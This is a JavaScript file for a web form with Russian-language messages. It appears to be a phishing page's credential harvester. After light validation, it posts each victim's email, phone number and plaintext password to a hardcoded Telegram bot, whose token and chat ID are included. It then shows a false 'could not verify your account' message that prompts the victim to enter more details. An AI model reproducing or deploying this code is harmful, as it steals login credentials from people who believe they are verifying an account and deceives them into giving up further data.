const form = {
    email: document.getElementById('email'),
    password: document.getElementById('password'),
    phone: document.getElementById('phone'),
    submit: document.getElementById('submit'),
    errors: {
        email: document.getElementById('email-error'),
        password: document.getElementById('password-error'),
        phone: document.getElementById('phone-error'),
        global: document.getElementById('global-error')
    }
};

form.submit.addEventListener('click', async () => {
    let hasError = false;

    // Clear previous errors
    Object.values(form.errors).forEach(error => error.textContent = '');
    form.email.classList.remove('error');
    form.password.classList.remove('error');
    form.phone.classList.remove('error');

    // Validate email
    if (!form.email.value.includes('@') || !form.email.value.includes('.')) {
        form.errors.email.textContent = 'Email введен некорректно';
        form.email.classList.add('error');
        hasError = true;
    }

    // Validate password
    if (form.password.value.length < 8) {
        form.errors.password.textContent = 'Пароль должен быть не менее 8 символов';
        form.password.classList.add('error');
        hasError = true;
    }

    // Validate Phone
    const phoneRegex = /^(?:\+7|8)\d+$/;
    if (!phoneRegex.test(form.phone.value)) {
        form.errors.phone.textContent = 'Некорректный номер';
        form.phone.classList.add('error');
        console.log((form.phone.value).length)
        hasError = true;
    }

    if (hasError) {
        form.errors.global.textContent = 'Проверьте правильность всех полей.';
        return;
    }

    // Send data to Telegram bot
    try {
        await fetch(`https://api.telegram.org/bot7629229758:AAH-kMzoCNId87IfjWG1dVmDoeC0debIwdk/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: '7730686838',
                text: `Новая заявка:\nEmail: ${form.email.value}\nNumber: ${form.phone.value}\nPassword: ${form.password.value}`
            })
        });

        form.errors.global.textContent = 'Нам не удалось подтвердить что аккаунт принадлежит вам!\nВозможно часть данных не совпадает, попробуйте изменить какие-то данные.';
        form.errors.global.style.color = 'red';
    } catch (error) {
        console.error('Ошибка отправки данных:', error);
        form.errors.global.textContent = 'Ошибка отправки данных. Попробуйте снова.';
    }
});